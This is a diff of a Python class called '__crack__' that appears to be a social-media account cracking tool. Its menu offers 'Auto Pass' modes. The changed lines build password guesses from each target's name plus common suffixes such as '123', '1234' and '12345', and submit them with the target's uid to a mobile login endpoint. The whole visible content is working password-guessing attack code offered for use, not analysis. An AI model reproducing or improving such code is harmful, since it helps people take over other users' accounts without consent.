@@ -576,11 +576,11 @@ class __crack__:
 
 		print ("\033[1;94m [1] Auto 2 Pass ([ PRO ] ")
 
-		print (" [2] Auto 2 Digit Pass ([ FAST ] ")
+		print (" [2] Auto 2 Digit Pass ([FAST] ")
 
-		print (" [3] Auto 5 Pass [ SLOW ]")
+		print (" [3] Auto 5 Pass [SLOW] ")
 
-		print (" [4] Auto 4 Digit Pass [ SLOW ]")
+		print (" [4] Auto 4 Digit Pass [SLOW] ")
 
 		yan = input('\n [•] \033[1;37m CHOOSE : ')
 
@@ -666,15 +666,15 @@ class __crack__:
 
 						elif len(xz) == 2:
 
-							pwx = [name, xz[0]+xz[1], xz[0]+"786"]
+							pwx = [name, xz[0]+xz[1], xz[0]+"123"]
 
 						elif len(xz) == 3:
 
-							pwx = [name, xz[0]+xz[1], xz[0]+"887"]
+							pwx = [name, xz[0]+xz[1], xz[0]+"123"]
 
 						elif len(xz) == 4:
 
-							pwx = [name, xz[0]+xz[1], xz[0]+"156"]
+							pwx = [name, xz[0]+xz[1], xz[0]+"123"]
 
 						else:
 
@@ -708,23 +708,23 @@ class __crack__:
 
 						if len(xz) == 1:
 
-							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"54321"]
+							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"1234", xz[0]+"12345"]
 
 						elif len(xz) == 2:
 
-							pwx = [name, xz[0]+xz[1], xz[0]+"456", xz[0]+"87654"]
+							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"1234", xz[0]+"12345"]
 
 						elif len(xz) == 3:
 
-							pwx = [name, xz[0]+xz[1], xz[0]+"789", xz[0]+"67890"]
+							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"1234", xz[0]+"12345"]
 
 						elif len(xz) == 4:
 
-							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"11806"]
+							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"1234", xz[0]+"12345"]
 
 						else:
 
-							pwx = [name, xz[0]+xz[1], xz[0]+"786", xz[0]+"15209"]
+							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"1234",xz[0]+"12345"]
 
 						_ngentot_gratis_.submit(self.__mbasic__, uid, pwx)
 
@@ -770,7 +770,7 @@ class __crack__:
 
 						else:
 
-							pwx = [name, xz[0]+"123", xz[0]+"12345"]
+							pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345"]
 
 						_ngentot_gratis_.submit(self.__mbasic__, uid, pwx)
 
